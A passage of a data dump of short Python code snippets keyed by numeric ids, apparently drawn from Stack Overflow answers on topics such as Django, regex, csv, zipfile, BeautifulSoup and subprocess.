</snippet></ROW><ROW><id>11896554</id><snippet>expr_list</snippet></ROW><ROW><id>11896554</id><snippet>expression</snippet></ROW><ROW><id>11896554</id><snippet>for f in tokenized:</snippet></ROW><ROW><id>11896554</id><snippet>dump</snippet></ROW><ROW><id>11896563</id><snippet>MyModelForm(instance=myInstanceModel)
MyModelForm(initial={ "my": "initial-data" })
</snippet></ROW><ROW><id>11896657</id><snippet>&gt;&gt;&gt; from decimal import Decimal
&gt;&gt;&gt; d = {
        'M': 6,
        'B': 9
}
&gt;&gt;&gt; def text_to_num(text):
        if text[-1] in d:
            num, magnitude = text[:-1], text[-1]
            return Decimal(num) * 10 ** d[magnitude]
        else:
            return Decimal(text)

&gt;&gt;&gt; text_to_num('3.17B')
Decimal('3170000000.00')
&gt;&gt;&gt; text_to_num('4M')
Decimal('4000000')
&gt;&gt;&gt; text_to_num('4.1234567891234B')
Decimal('4123456789.1234000000000')
</snippet></ROW><ROW><id>11896657</id><snippet>int()</snippet></ROW><ROW><id>11896737</id><snippet>baz</snippet></ROW><ROW><id>11896737</id><snippet>Boo</snippet></ROW><ROW><id>11896737</id><snippet>Foo</snippet></ROW><ROW><id>11896737</id><snippet>class Foo (object) :
    def baz (self) :
        return 324

class Bar (object) :
    def __init__ (self) :
        self.foo = Foo()

    @property
    def baz(self):
        return self.foo.baz

    def __getattr__(self, attr):
        return getattr(self.foo, attr)

bar = Bar()
print bar.foo.baz()
print bar.baz()
</snippet></ROW><ROW><id>11896737</id><snippet>baz</snippet></ROW><ROW><id>11896737</id><snippet>baz</snippet></ROW><ROW><id>11896737</id><snippet>Foo</snippet></ROW><ROW><id>11896737</id><snippet>Bar</snippet></ROW><ROW><id>11896737</id><snippet>Foo</snippet></ROW><ROW><id>11896737</id><snippet>__getattr__</snippet></ROW><ROW><id>11896737</id><snippet>class Foo (object) :
    def baz (self) :
        return 324

class Bar (object) :
    def __init__ (self) :
        self.foo = Foo()

    def __getattr__(self, attr):
        return getattr(self.foo, attr)

bar = Bar()
print bar.foo.baz()
print bar.baz()
</snippet></ROW><ROW><id>11896737</id><snippet>Bar</snippet></ROW><ROW><id>11896737</id><snippet>Foo</snippet></ROW><ROW><id>11896737</id><snippet>Bar</snippet></ROW><ROW><id>11896737</id><snippet>Bar</snippet></ROW><ROW><id>11896737</id><snippet>__getattr__</snippet></ROW><ROW><id>11896737</id><snippet>Bar</snippet></ROW><ROW><id>11896737</id><snippet>Foo</snippet></ROW><ROW><id>11896737</id><snippet>Bar</snippet></ROW><ROW><id>11896737</id><snippet>Foo</snippet></ROW><ROW><id>11896737</id><snippet>Foo</snippet></ROW><ROW><id>11896737</id><snippet>Bar</snippet></ROW><ROW><id>11896737</id><snippet>Foo</snippet></ROW><ROW><id>11896737</id><snippet>Bar</snippet></ROW><ROW><id>11896737</id><snippet>Foo</snippet></ROW><ROW><id>11896737</id><snippet>class Foo (object) :
    def baz (self) :
        return 324

class Bar (object) :
    def __init__ (self) :
        self.foo = Foo()

    for _method in ['baz', 'blob']:
        @property
        def _tmp_func(self, _name=_method):
            return getattr(self.foo, _name)
        locals()[_method] = _tmp_func
    # del to avoid name pollution
    del _method, _tmp_func

bar = Bar()
print bar.foo.baz()
print bar.baz()
</snippet></ROW><ROW><id>11896737</id><snippet>__getattr__</snippet></ROW><ROW><id>11896737</id><snippet>Bar</snippet></ROW><ROW><id>11896737</id><snippet>_method</snippet></ROW><ROW><id>11896737</id><snippet>_tmp_func</snippet></ROW><ROW><id>11897339</id><snippet>tangibles</snippet></ROW><ROW><id>11897339</id><snippet>tangibles[1]</snippet></ROW><ROW><id>11897339</id><snippet>tangibles[1]*1000</snippet></ROW><ROW><id>11897339</id><snippet>float</snippet></ROW><ROW><id>11897339</id><snippet>long</snippet></ROW><ROW><id>11897339</id><snippet>float(tangibles[1])</snippet></ROW><ROW><id>11897339</id><snippet>&gt;&gt;&gt; x = '1'
&gt;&gt;&gt; x
'1'
&gt;&gt;&gt; x*10
'1111111111'
&gt;&gt;&gt; float(x)
1.0
&gt;&gt;&gt; float(x*10)
1111111111.0
</snippet></ROW><ROW><id>11897498</id><snippet>ModPoly.ob_item</snippet></ROW><ROW><id>11897498</id><snippet>ModPoly_new()</snippet></ROW><ROW><id>11897498</id><snippet>NULL</snippet></ROW><ROW><id>11897498</id><snippet>ModPoly_getcoefs()</snippet></ROW><ROW><id>11897498</id><snippet>ob_item</snippet></ROW><ROW><id>11897498</id><snippet>ModPoly_init()</snippet></ROW><ROW><id>11897918</id><snippet>fp</snippet></ROW><ROW><id>11897918</id><snippet>if not self.zf.fp:
    self.zf = zipfile.ZipFile(self.path)
</snippet></ROW><ROW><id>11897918</id><snippet>zipfile</snippet></ROW><ROW><id>11897918</id><snippet>open</snippet></ROW><ROW><id>11897918</id><snippet>RuntimeError</snippet></ROW><ROW><id>11897918</id><snippet>not self.fp</snippet></ROW><ROW><id>11897918</id><snippet>.close</snippet></ROW><ROW><id>11897918</id><snippet>class MyZipFile(zipfile.ZipFile):
    closed = False
    def close(self):
        self.closed = True
        super(MyZipFile, self).close()
</snippet></ROW><ROW><id>11897918</id><snippet>if self.zf.closed:
    self.zf = MyZipFile(self.path)
</snippet></ROW><ROW><id>11897947</id><snippet>import traceback, StringI

def functionInProcessA():
    raise Exception('Something happened in A')

class RemoteException(Exception):
    def __init__(self, tb):
        Exception.__init__(self, "Remote traceback:\n\n%s" % tb)

def controlProcessB():
    try:
        functionInProcessA()
    except:
        fd = StringIO.StringIO()
        traceback.print_exc(file=fd)
        tb = fd.getvalue()
        raise RemoteException(tb)

if __name__ == '__main__':
    controlProcessB()
</snippet></ROW><ROW><id>11897947</id><snippet>Traceback (most recent call last):
  File "a.py", line 20, in &lt;module&gt;
    controlProcessB()
  File "a.py", line 17, in controlProcessB
    raise RemoteException(tb)
__main__.RemoteException: Remote traceback:

Traceback (most recent call last):
  File "a.py", line 12, in controlProcessB
    functionInProcessA()
  File "a.py", line 4, in functionInProcessA
    raise Exception('Something happened in A')
Exception: Something happened in A
</snippet></ROW><ROW><id>11898075</id><snippet>import re

s = "foo[bar]baz"
m = re.search("[\[\]]", s)
print m.group(0)
# =&gt; '['

t = "foo-bar]baz"
n = re.search("[\[\]]", t)
print n.group(0)
# =&gt; ']'
</snippet></ROW><ROW><id>11898075</id><snippet>re.IGNORECASE</snippet></ROW><ROW><id>11898075</id><snippet>u = "foo\\-bar]baz"
o = re.search('[\[\]]', u) # Does this match the \ ?
print o.group(0)
# =&gt; ']'
# Behold!
</snippet></ROW><ROW><id>11898079</id><snippet>class Ventana(Gtk.Window):
    def __init__(self, title = "Test"):
        Gtk.Window.__init__(self,title="Test Window")
        paises=Gtk.ListStore(int,str)
        paises.append([1,"test"])

         combo=Gtk.ComboBox.new_with_model_and_entry(paises)
         combo.set_entry_text_column(1)
         self.add(combo)
</snippet></ROW><ROW><id>11898134</id><snippet>self</snippet></ROW><ROW><id>11898134</id><snippet>Py_INCREF</snippet></ROW><ROW><id>11898215</id><snippet>User.py</snippet></ROW><ROW><id>11898215</id><snippet>models/</snippet></ROW><ROW><id>11898215</id><snippet>User</snippet></ROW><ROW><id>11898215</id><snippet>models.py</snippet></ROW><ROW><id>11898215</id><snippet>models.pyc</snippet></ROW><ROW><id>11898215</id><snippet>from models.User import User</snippet></ROW><ROW><id>11898215</id><snippet>models/</snippet></ROW><ROW><id>11898215</id><snippet>touch models/__init__.py</snippet></ROW><ROW><id>11898226</id><snippet>re</snippet></ROW><ROW><id>11898226</id><snippet>fileinput</snippet></ROW><ROW><id>11898226</id><snippet>import fileinput
import re

fn = "test.txt" # your filename

r = re.compile('a(.+?)a')
for line in fileinput.input(fn, inplace=1):
  match = r.match(line)
  print match.group() if match else line.replace('\n', '')
</snippet></ROW><ROW><id>11898284</id><snippet>python setup.py develop</snippet></ROW><ROW><id>11898284</id><snippet>python setup.py install</snippet></ROW><ROW><id>11898284</id><snippet>install</snippet></ROW><ROW><id>11898284</id><snippet>site-packages</snippet></ROW><ROW><id>11898284</id><snippet>develop</snippet></ROW><ROW><id>11898284</id><snippet>egg-link</snippet></ROW><ROW><id>11898284</id><snippet>dynamic</snippet></ROW><ROW><id>11898284</id><snippet>pserve production.ini</snippet></ROW><ROW><id>11898408</id><snippet>setattr</snippet></ROW><ROW><id>11898408</id><snippet>getattr</snippet></ROW><ROW><id>11898408</id><snippet>setattr(self, key, count)</snippet></ROW><ROW><id>11898408</id><snippet>getattr(self, key)</snippet></ROW><ROW><id>11898431</id><snippet>["10$^{}$".format(int(math.log10(num))) for num in a]
</snippet></ROW><ROW><id>11898431</id><snippet>from math import *

def toLatex(powerOf10):
    exponent = int( log10(powerOf10) )
    return "10$^{}$".format(exponent)

nums = [10**-20, 0.01, 0.1, 1, 10, 100, 1000, 10**20]
[(x, toLatex(x)) for x in nums]
</snippet></ROW><ROW><id>11898431</id><snippet>[(1e-20, '10$^-20$'),
 (0.01, '10$^-2$'),
 (0.1, '10$^-1$'),
 (1, '10$^0$'),
 (10, '10$^1$'),
 (100, '10$^2$'),
 (1000, '10$^3$'),
 (100000000000000000000L, '10$^20$')]
</snippet></ROW><ROW><id>11898695</id><snippet>import sys
import threading

import cmd


def monitor():
    r = redis.Redis(YOURHOST, YOURPORT, YOURPASSWORD, db=0)

    channel = sys.argv[1]
    p = r.pubsub()

    p.subscribe(channel)

    print 'monitoring channel', channel
    for m in p.listen():
        print m['data']


class my_cmd(cmd.Cmd):
    """Simple command processor example."""

    def do_start(self, line):
        my_thread.start()

    def do_EOF(self, line):
        return True

if __name__ == '__main__':
    if len(sys.argv) == 1:
        print "missing argument! please provide the channel name."
    else:
        my_thread = threading.Thread(target=monitor)
        my_thread.setDaemon(True)

        my_cmd().cmdloop()
</snippet></ROW><ROW><id>11898758</id><snippet>from Entities import CapacityMin
</snippet></ROW><ROW><id>11898758</id><snippet>from Entities.CapacityMin import CapacityMin
</snippet></ROW><ROW><id>11898758</id><snippet>from entities.capacitymin import CapacityMin
</snippet></ROW><ROW><id>11898834</id><snippet>[int(val) for val in x]
</snippet></ROW><ROW><id>11899115</id><snippet>import win32com.client

xl = win32com.client.Dispatch("Excel.Application")
print(xl.ActiveWorkbook.FullName)
</snippet></ROW><ROW><id>11899341</id><snippet>t.start()</snippet></ROW><ROW><id>11899341</id><snippet>    print "Finished thread %s" % limit
</snippet></ROW><ROW><id>11899414</id><snippet>first_value = None
for i,x in enumerate(urunler):
    if x['fiyat'] == eklenecek['fiyat'] and x['urunobegi'] == eklenecek['urunobegi']:
        first_value = x['id']
        break
</snippet></ROW><ROW><id>11899414</id><snippet>first_value</snippet></ROW><ROW><id>11899414</id><snippet>None</snippet></ROW><ROW><id>11899414</id><snippet>last_value = None
for i,x in enumerate(urunler):
    if x['fiyat'] == eklenecek['fiyat'] and x['urunobegi'] == eklenecek['urunobegi']:
        last_value = x['id']
</snippet></ROW><ROW><id>11899414</id><snippet>lst = [x['id'] for x in urunler if x['fiyat'] == eklenecek['fiyat']
                       and x['urunobegi'] == eklenecek['urunobegi']]

# First element: lst[0]
# Last element: lst[-1]
</snippet></ROW><ROW><id>11899656</id><snippet>./manage.py syncdb</snippet></ROW><ROW><id>11899697</id><snippet>bp::object ret = bp::eval(...)
</snippet></ROW><ROW><id>11900023</id><snippet>collections.Counter</snippet></ROW><ROW><id>11900023</id><snippet>&gt;&gt;&gt; from collections import Counter
&gt;&gt;&gt; c = Counter(['hello', 'hello', 1])
&gt;&gt;&gt; print c
Counter({'hello': 2, 1: 1})
</snippet></ROW><ROW><id>11900023</id><snippet>&gt;&gt;&gt; from collections import Counter
&gt;&gt;&gt; c = Counter(['hello', 'hello', 1])
&gt;&gt;&gt; print c
Counter({'hello': 2, 1: 1})
&gt;&gt;&gt; c.update(['hello'])
&gt;&gt;&gt; print c
Counter({'hello': 3, 1: 1})
</snippet></ROW><ROW><id>11900103</id><snippet>key</snippet></ROW><ROW><id>11900103</id><snippet>max()</snippet></ROW><ROW><id>11900103</id><snippet>import os
import glob

filename = max(glob.iglob("c:/csvfiles/*.csv"), key=os.path.getmtime)
</snippet></ROW><ROW><id>11900103</id><snippet>os.path.getctime</snippet></ROW><ROW><id>11900103</id><snippet>os.path.getmtime</snippet></ROW><ROW><id>11900175</id><snippet>#decorator is declared outside of class and type dict is passed in as an argument
def type_handler(name, type_dict):
    def wrapper(f):
        type_dict[name] = f
        return f
    return wrapper

class MyClass(object):

    types = {}

    @type_handler('a', types)
    def foo_a(self, a):
        pass

    @type_handler('b', types)
    def foo_b(self, b):
        pass
</snippet></ROW><ROW><id>11900175</id><snippet>class TypeHandler(object):
    def __init__(self, type_dict):
        self.types = type_dict

    def __call__(self, name):
        def wrapper(f):
            self.types[name] = f
            return f
        return wrapper


class MyClass(object):
    types = {}
    thandle = TypeHandler(types)

    @thandle('a')
    def foo_a(self, a):
        pass
</snippet></ROW><ROW><id>11900335</id><snippet>try:
    Mydef(2,1)
except ValueError, e:
    # Do some stuff when exception is raised, e.message will contain your message
</snippet></ROW><ROW><id>11900335</id><snippet>def Mydef(n1,n2):
    if (n1&gt;n2):
        return
</snippet></ROW><ROW><id>11900405</id><snippet>p = Point(*ppp)</snippet></ROW><ROW><id>11900405</id><snippet>ppp</snippet></ROW><ROW><id>11900783</id><snippet>import csv
large = [('5501', [(4, 5, 8), (6, -4, -6)]), ('2222', [(2, -4, 5), (1, 15, -4)])]

with open("out1.csv", "wb") as fp: # open the file, call it fp, and autoclose it
    writer = csv.writer(fp, delimiter=",")
    for entry in large:
        writer.writerow([entry[0]]) # one-element list
        for line in entry[1]: # loop over each tuple in the second element
            writer.writerow(line)
        writer.writerow([]) # write an empty row
</snippet></ROW><ROW><id>11900783</id><snippet>localhost-2:coding $ cat out1.csv 
5501
4,5,8
6,-4,-6

2222
2,-4,5
1,15,-4
</snippet></ROW><ROW><id>11900783</id><snippet>csv</snippet></ROW><ROW><id>11900783</id><snippet>final</snippet></ROW><ROW><id>11900783</id><snippet>large</snippet></ROW><ROW><id>11900784</id><snippet>glob</snippet></ROW><ROW><id>11900784</id><snippet>import glob
for fn in glob.glob('pid*'):
    with open(fn) as f:
        if 'done' in f.read():
            ...
</snippet></ROW><ROW><id>11900911</id><snippet>sys.exit</snippet></ROW><ROW><id>11900911</id><snippet>stderr</snippet></ROW><ROW><id>11900911</id><snippet>python yourscript 2&gt; return_file
</snippet></ROW><ROW><id>11900911</id><snippet>output=$((your command here) 2&gt; &amp;1)
</snippet></ROW><ROW><id>11900911</id><snippet>print "something"
exit('ohoh') 
</snippet></ROW><ROW><id>11900911</id><snippet>va=$(python test.py 2&gt;&amp;1)                                                                                                                    
mkdir $va
</snippet></ROW><ROW><id>11900911</id><snippet>bash t.sh</snippet></ROW><ROW><id>11900911</id><snippet>import script1
import script2

if __name__ == '__main__':
    filename = script1.run(sys.args)
    script2.run(filename)
</snippet></ROW><ROW><id>11900976</id><snippet>def input_int(prompt):
    while True:
        try:
            return int(raw_input(prompt))
        except ValueError:
            print "That's not a valid integer!"

...
num = input_int("Please enter a number: ")
num2 = input_int("Please enter another number: ")
</snippet></ROW><ROW><id>11901308</id><snippet>enumerate</snippet></ROW><ROW><id>11901308</id><snippet>xrange(len(something))</snippet></ROW><ROW><id>11901308</id><snippet>len</snippet></ROW><ROW><id>11901338</id><snippet>checkID()</snippet></ROW><ROW><id>11901338</id><snippet>checkNickname()</snippet></ROW><ROW><id>11901338</id><snippet>request.POST</snippet></ROW><ROW><id>11901338</id><snippet>cleaned_data</snippet></ROW><ROW><id>11901541</id><snippet>from functools import wraps
import errno
import os
import signal

class TimeoutError(Exception):
    pass

def timeout(seconds=10, error_message=os.strerror(errno.ETIME)):
    def decorator(func):
        def _handle_timeout(signum, frame):
            raise TimeoutError(error_message)

        def wrapper(*args, **kwargs):
            signal.signal(signal.SIGALRM, _handle_timeout)
            signal.setitimer(signal.ITIMER_REAL,seconds) #used timer instead of alarm
            try:
                result = func(*args, **kwargs)
            finally:
                signal.alarm(0)
            return result

        return wraps(func)(wrapper)

    return decorator
</snippet></ROW><ROW><id>11901541</id><snippet>from timeout import timeout 
import re 

@timeout(0.01)
def match_re(regex,line):
    return re.match(regex,line)
try:
    print match_re('^tra.+$','tralalalalallalalal')
except Exception, e:
    print 'timeout!'
</snippet></ROW><ROW><id>11901881</id><snippet>$ cat test1.py
from subprocess import Popen
import time

process = Popen(["python","doesnotexist.py"])
time.sleep(3)

alive = process.poll()
if alive is None:
    print "Still running"
else:
    print "Not running\r\n"
    print "%r" % alive
$ python test1.py 
python: can't open file 'doesnotexist.py': [Errno 2] No such file or directory
Not running

2
</snippet></ROW><ROW><id>11901891</id><snippet>if formset.is_valid():
    formset.save()
    return HttpResponseRedirect("")
</snippet></ROW><ROW><id>11901913</id><snippet>from BeautifulSoup import BeautifulSoup, Comment

t = '&lt;html&gt;&lt;table&gt;' +\
    '&lt;tr&gt;&lt;td class="label"&gt; a &lt;/td&gt; &lt;td&gt; 1 &lt;/td&gt;&lt;/tr&gt;' +\
    '&lt;tr&gt;&lt;td class="label"&gt; b &lt;/td&gt; &lt;td&gt; 2 &lt;/td&gt;&lt;/tr&gt;' +\
    '&lt;tr&gt;&lt;td class="label"&gt; c &lt;/td&gt; &lt;td&gt; 3 &lt;/td&gt;&lt;/tr&gt;' +\
    '&lt;tr&gt;&lt;td class="label"&gt; d &lt;/td&gt; &lt;td&gt; 4 &lt;/td&gt;&lt;/tr&gt;' +\
    '&lt;/table&gt;&lt;/html&gt;'

bs = BeautifulSoup(t)

results = {}
for row in bs.findAll('tr'):
    aux = row.findAll('td')
    results[aux[0].string] = aux[1].string

print results
</snippet></ROW><ROW><id>11901941</id><snippet>subprocess.Popen("su - dhclient eth0", shell=True)
</snippet></ROW><ROW><id>11901987</id><snippet>&gt;&gt;&gt; re.search(re.escape("Stack(R) Overflow"), "Hey bro, Stack(R) Overflow", re.I)
&lt;_sre.SRE_Match object at 0xb778adb0&gt;
</snippet></ROW><ROW><id>11902312</id><snippet>if title and articleNumber in listOfData:
    listOfData[articleNumber] = (title, articleNumber, None, oldvariants + variants)
else:
    listOfData.append((title, articleNumber, None, variants))
</snippet></ROW><ROW><id>11902312</id><snippet>update</snippet></ROW><ROW><id>11902324</id><snippet>In [1]: def testthis(): print "hello"

In [2]: import inspect

In [3]: inspect.getsourcelines(testthis)
Out[3]: ([u'def testthis(): print "hello"\n'], 1)
</snippet></ROW><ROW><id>11902334</id><snippet>with open(logfile) as fin:
    for line in fin:
        if var.lower() in line.lower():  # makes this case insensitive
            print 'found', line.rstrip() # You will be printing double new lines 
                                         #  without rstrip here
</snippet></ROW><ROW><id>11902361</id><snippet>mkdir -p $HOME/.local/lib64/python2.7/site-packages
mkdir $HOME/bin
</snippet></ROW><ROW><id>11902361</id><snippet>--user</snippet></ROW><ROW><id>11902361</id><snippet>pip</snippet></ROW><ROW><id>11902361</id><snippet>sys.path</snippet></ROW><ROW><id>11902361</id><snippet>pip install --user --install-option="--install-scripts=$HOME/bin"
</snippet></ROW><ROW><id>11902442</id><snippet>User.full_name = property(lambda u: u"%s %s" % (u.first_name, u.last_name))
</snippet></ROW><ROW><id>11902442</id><snippet>def user_new_unicode(self):
    return self.get_full_name()

# Replace the __unicode__ method in the User class with out new implementation
User.__unicode__ = user_new_unicode 

# or maybe even
User.__unicode__ = User.get_full_name()
</snippet></ROW><ROW><id>11902442</id><snippet>def user_new_unicode(self):
    return self.username if self.get_full_name() == "" else self.get_full_name()

# Replace the __unicode__ method in the User class with out new implementation
User.__unicode__ = user_new_unicode 
</snippet></ROW><ROW><id>11902480</id><snippet>try:
    gotdata = dlist[1]
except IndexError:
    gotdata = 'null'
</snippet></ROW><ROW><id>11902480</id><snippet>len()</snippet></ROW><ROW><id>11902480</id><snippet>dlist</snippet></ROW><ROW><id>11902668</id><snippet>p.filter('person_name &gt;=', searched_name)
p.filter('person_name &lt;', searched_name + u'\ufffd')
</snippet></ROW><ROW><id>11902705</id><snippet>expand</snippet></ROW><ROW><id>11902705</id><snippet>src_im = Image.open("test.gif")
im = src_im.rotate(30, expand=True)
im.save("result.gif")
</snippet></ROW><ROW><id>11902705</id><snippet>transparency = im.info['transparency'] 
im.save('icon.gif', transparency=transparency)
</snippet></ROW><ROW><id>11902719</id><snippet>&gt;&gt;&gt; d = {'a': 2, 'and': 23, 'this': 14, 'only.': 21, 'is': 2, 'work': 2, 'will': 2, 'as': 2, 'test': 4}
&gt;&gt;&gt; t = sorted(d.iteritems(), key=lambda x:-x[1])[:3]

&gt;&gt;&gt; for x in t:
...     print "{0}: {1}".format(*x)
... 
and: 23
only.: 21
this: 14
</snippet></ROW><ROW><id>11902779</id><snippet>for x, left in enumerate(all):
    for y, right in enumerate(all):
        common = len(set(left) &amp; set(right))
        print "item%s has %s values in common with item%s"%(x, common, y)
</snippet></ROW><ROW><id>11903085</id><snippet>shutil.copy()</snippet></ROW><ROW><id>11903085</id><snippet>glob.iglob()</snippet></ROW><ROW><id>11903085</id><snippet>import glob
import shutil
import os

src_dir = "your/source/dir"
dst_dir = "your/destination/dir"
for jpgfile in glob.iglob(os.path.join(src_dir, "*.jpg")):
    shutil.copy(jpgfile, dst_dir)
</snippet></ROW><ROW><id>11903230</id><snippet>i = int(i)</snippet></ROW><ROW><id>11903230</id><snippet>assertRaises</snippet></ROW><ROW><id>11903424</id><snippet>l1</snippet></ROW><ROW><id>11903424</id><snippet>l1</snippet></ROW><ROW><id>11903424</id><snippet>set.intersection()</snippet></ROW><ROW><id>11903424</id><snippet>l1 = set(l1)
d2 = {k: [s for s in v if s in l1] for k, v in d1.iteritems()}
d2 = {k: v for k, v in d2.iteritems() if v}
</snippet></ROW><ROW><id>11903424</id><snippet>for</snippet></ROW><ROW><id>11903424</id><snippet>l1 = set(l1)
d2 = {}
for k, v in d1.iteritems():
    v = [s for s in v if s in l1]
    if v:
        d2[k] = v
</snippet></ROW><ROW><id>11903614</id><snippet>finditer</snippet></ROW><ROW><id>11903614</id><snippet>start()</snippet></ROW><ROW><id>11903614</id><snippet>import re

a="This is a testing text and used to test and test and test."
print [m.start() for m in re.finditer(r"\btest\b", a)]
print [m.start() for m in re.finditer(r"\btest and\b", a)]
</snippet></ROW><ROW><id>11903976</id><snippet>max_row = ws.get_highest_row() # find last row of worksheet
reff = "A1:A" + str(max_row) # build an Excel range covering the data
values = [cell.value for cell in ws.range(reff)] # collect the data
ws.cell('A' + str(max_row + 1)).value = ' '.join(values) # write values
</snippet></ROW><ROW><id>11903990</id><snippet>reload(imported_module_name)</snippet></ROW><ROW><id>11904021</id><snippet>bar</snippet></ROW><ROW><id>11904021</id><snippet>__init__()</snippet></ROW><ROW><id>11904021</id><snippet>class Foo:
    def __init__(self, the_bar=Bar(0,0,0)):
        self.my_bar = the_bar
</snippet></ROW><ROW><id>11904021</id><snippet>Foo</snippet></ROW><ROW><id>11904021</id><snippet>Bar</snippet></ROW><ROW><id>11904021</id><snippet>Bar</snippet></ROW><ROW><id>11904021</id><snippet>class Foo:
    def __init__(self, the_bar=None):
        if the_bar is None:
            the_bar = Bar(0,0,0)
        self.my_bar = the_bar
</snippet></ROW><ROW><id>11904056</id><snippet>base.html</snippet></ROW><ROW><id>11904056</id><snippet>&lt;html&gt;
&lt;head&gt;
    &lt;link rel="stylesheet" type="text/css" href="{{ STATIC_URL }}/css/main.css"&gt;
    {% block additional_header %}
    {% endblock %}
&lt;/head&gt;
&lt;body&gt;
    {% block content %}
    {% endblock %}
&lt;/body&gt;
&lt;/html&gt;
</snippet></ROW><ROW><id>11904056</id><snippet>{% extends 'base.html' %}
{% block content %}
This is specific content for your page
{% endblock %}
</snippet></ROW><ROW><id>11904056</id><snippet>Template Inheritance</snippet></ROW><ROW><id>11904141</id><snippet>import os
print os.stat('somefile.ext').st_size
</snippet></ROW><ROW><id>11904417</id><snippet>\n</snippet></ROW><ROW><id>11904417</id><snippet> </snippet></ROW><ROW><id>11904417</id><snippet>from BeautifulSoup import BeautifulSoup
soup = BeautifulSoup(open('this-stackoverflow-page.html'))

for anchor in soup('a'):
    print anchor.contents, anchor.get('href')
</snippet></ROW><ROW><id>11904417</id><snippet>[u'Stack Exchange'] http://stackexchange.com
[u'msw'] /users/282912/msw
[u'faq'] /faq
[u'Stack Overflow'] /
[u'Questions'] /questions
[u'How to use Beautiful Soup to get plaintext and URLs from an HTML document?'] /questions/11902974/how-to-use-beautiful-soup-to-get-plaintext-and-urls-from-an-html-document
[u'http://www.locationary.com/places/duplicates.jsp?inPID=1000000001'] http://www.locationary.com/places/duplicates.jsp?inPID=1000000001
[u'python'] /questions/tagged/python
[u'beautifulsoup'] /questions/tagged/beautifulsoup
[u'Marcus Johnson'] /users/1587751/marcus-johnson
</snippet></ROW><ROW><id>11904495</id><snippet>self.btnBrowse.clicked.connect(lambda: self.browseFile(option))
</snippet></ROW><ROW><id>11904746</id><snippet>Loader</snippet></ROW><ROW><id>11904746</id><snippet>if DEBUG:
    TEMPLATE_LOADERS = [
    'django.template.loaders.filesystem.Loader',
    'django.template.loaders.app_directories.Loader',      
    ]
else:
    TEMPLATE_LOADERS = [
        ('django.template.loaders.cached.Loader',(
            'django.template.loaders.filesystem.Loader',
            'django.template.loaders.app_directories.Loader',
            'forum.modules.template_loader.module_templates_loader',
            'forum.skins.load_template_source',
            )),
    ]
</snippet></ROW><ROW><id>11904746</id><snippet>forum</snippet></ROW><ROW><id>11904746</id><snippet>Loader</snippet></ROW><ROW><id>11904986</id><snippet>import inspect
def printfunc()
    stk = inspect.stack()[1]
    mod = inspect.getmodule(stk[0])
    print "Currently in " + mod + "." + stk[3]
</snippet></ROW><ROW><id>11904986</id><snippet>printfunc()</snippet></ROW><ROW><id>11905051</id><snippet>test1 = 0
def testFunc():
    global test1 
    test1 += 1
testFunc()
</snippet></ROW><ROW><id>11905051</id><snippet>global</snippet></ROW><ROW><id>11905051</id><snippet>test1 = 0
def testFunc():
     print test1 
testFunc()
</snippet></ROW><ROW><id>11905051</id><snippet>global</snippet></ROW><ROW><id>11905072</id><snippet>i = 1</snippet></ROW><ROW><id>11905072</id><snippet>i</snippet></ROW><ROW><id>11905363</id><snippet>CSRF_COOKIE_DOMAIN</snippet></ROW><ROW><id>11905478</id><snippet>ord</snippet></ROW><ROW><id>11905478</id><snippet>&gt;&gt;&gt; ll = ["%02X" % (ord(x)) for x in '\x02S20390908127F010102F3004000900300000000000000000000000000000300A500000000000202020202020206070505050505050000000707070707070707020700000000000000000000000000000000000000008000800089237A0715047E000000000000000000000000000000000000000000000000000000000000000000000000005350374646303030\x1732']
&gt;&gt;&gt; ll           #as a list
['02', '53', '32', '30', '33', '39', '30', '39', '30', '38', '31', '32', '37', '46', '30', '31', '30', '31', '30', '32', '46', '33', '30', '30', '34', '30', '30', '30', '39', '30', '30', '33', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '33', '30', '30', '41', '35', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '32', '30', '32', '30', '32', '30', '32', '30', '32', '30', '32', '30', '32', '30', '36', '30', '37', '30', '35', '30', '35', '30', '35', '30', '35', '30', '35', '30', '35', '30', '30', '30', '30', '30', '30', '30', '37', '30', '37', '30', '37', '30', '37', '30', '37', '30', '37', '30', '37', '30', '37', '30', '32', '30', '37', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '38', '30', '30', '30', '38', '30', '30', '30', '38', '39', '32', '33', '37', '41', '30', '37', '31', '35', '30', '34', '37', '45', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '30', '35', '33', '35', '30', '33', '37', '34', '36', '34', '36', '33', '30', '33', '30', '33', '30', '17', '33', '32']
&gt;&gt;&gt; ' '.join(ll) # as a string
'02 53 32 30 33 39 30 39 30 38 31 32 37 46 30 31 30 31 30 32 46 33 30 30 34 30 30 30 39 30 30 33 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 33 30 30 41 35 30 30 30 30 30 30 30 30 30 30 30 32 30 32 30 32 30 32 30 32 30 32 30 32 30 36 30 37 30 35 30 35 30 35 30 35 30 35 30 35 30 30 30 30 30 30 30 37 30 37 30 37 30 37 30 37 30 37 30 37 30 37 30 32 30 37 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 38 30 30 30 38 30 30 30 38 39 32 33 37 41 30 37 31 35 30 34 37 45 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 35 33 35 30 33 37 34 36 34 36 33 30 33 30 33 30 17 33 32'
